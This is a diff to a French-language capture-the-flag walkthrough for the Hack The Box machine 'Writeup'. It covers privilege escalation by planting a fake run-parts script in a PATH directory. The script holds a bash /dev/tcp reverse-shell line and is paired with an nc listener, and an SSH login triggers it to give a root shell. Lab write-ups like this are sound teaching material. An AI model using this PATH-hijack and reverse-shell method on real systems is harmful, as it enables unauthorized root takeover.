@@ -625,7 +625,7 @@ Pour exploiter le détournement de `PATH`, tu vas créer un **faux binaire `run-
 
 Sur ta machine Kali, commence par ouvrir un listener :
 
-```
+```bash
 nc -lvnp 4444
 ```
 
@@ -633,45 +633,55 @@ nc -lvnp 4444
 
 2. Créer le binaire piégé sur la cible
 
-Sur la machine cible, crée un fichier nommé `run-parts` dans `/usr/local/bin` :
+Sur la machine cible, crée un fichier nommé `run-parts` dans `/usr/local/` :
 
-```
-nano /usr/local/bin/run-parts
+```bash
+cd /usr/local/
+nano run-parts
 ```
 
 Ajoute le contenu suivant (en adaptant l’IP à celle de ta machine Kali) :
 
-```
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
 ```
 
 ------
 
-3. Rendre le binaire exécutable
+3. Rends le script exécutable
 
-```
-chmod +x /usr/local/bin/run-parts
+```bash
+chmod +x run-parts
 ```
 
 ------
 
-4. Déclenchement automatique
+4. copie le script dans /usr/local/bin
+
+   ```bash
+   cp run-parts bin/
+   ```
+
+   
+
+5. **Immédiatement après**, connecte-toi en ssh depuis un autre terminal dans Kali
+
+   ```bash
+   ssh jkr@writeup.htb
+   ```
+
+   
 
 Aucune action supplémentaire n’est nécessaire.
- Lors de la prochaine connexion SSH, root appellera `run-parts` sans chemin absolu.
- Le système exécutera alors **ton binaire**, ce qui déclenchera immédiatement le reverse shell.
+Lors de la connexion SSH, root appellera `run-parts` sans chemin absolu. Le système exécutera alors **ton binaire**, ce qui déclenchera immédiatement le reverse shell.
 
 ------
 
 5. Vérification côté Kali
 
 Dans le terminal Kali, tu obtiens un shell root.
- Tu peux le confirmer avec :
 
-```
-whoami
-```
 
 ```
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/writeup]
@@ -686,9 +696,15 @@ root@writeup:/# whoami
 whoami
 root
 root@writeup:/#
+
+```
+
+### root.txt
+
+```bash
 root@writeup:/# cat /root/root.txt
 cat /root/root.txt
-e36c1e7288baa06c73718bddd79609cc
+e36cxxxxxxxxxxxxxxxxxxxxxxxx09cc
 root@writeup:/#
 ```
 
